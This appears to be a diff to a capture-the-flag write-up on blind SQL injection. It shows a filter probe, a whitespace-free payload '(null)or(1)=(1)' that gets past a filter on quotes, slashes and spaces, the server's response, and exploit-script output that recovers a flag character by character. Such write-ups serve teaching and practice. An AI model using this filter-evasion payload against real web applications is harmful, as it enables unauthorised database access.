@@ -43,19 +43,47 @@ tmr@desktop:~$ python pattern_detector.py
 [+]   is filtred  //whitespace
 [+] " is filtred  //quotes
 [+] ' is filtred
-[+] / is filtred  // slache
-[+] \ is filtred  // anti-slache
+[+] / is filtred  // slashe
+[+] \ is filtred  // anti-slashe
 ```
+
+As you can see above whitespace slaches and quotes are all catched by the target. But MySQL offer the possibility to avoid whitespaces by using parenthesis to seperate SQL keywords. 
+
+For example, you can inject a boolean expression :
 
 
 ```
-GET /demo/index.php?id=(null)or(1)=(1) HTTP/1.1
+GET /index.php?id=(null)or(1)=(1) HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:20.0) Gecko/20100101 Iceweasel
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: keep-alive
 ```
+
+We get a valid reponse from the server (the profil page is displyed correctly) :
+
+```
+HTTP/1.1 200 OK
+Date: Sat, 30 May 2015 23:23:37 GMT
+Server: Apache
+Vary: Accept-Encoding
+Content-Length: 3827
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+
+<!doctype html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html">
+  <title>User Profile s...
+```
+
+Then, you can craft your own exploit to guess the table name :
+
 
 ```
 tmr@desktop:~$ python exploit.py 
@@ -87,3 +115,5 @@ FLAG_ENTAYA_M3ALE
 [+] New Guessed Char : M
 FLAG_ENTAYA_M3ALEM
 ```
+
+That's it !
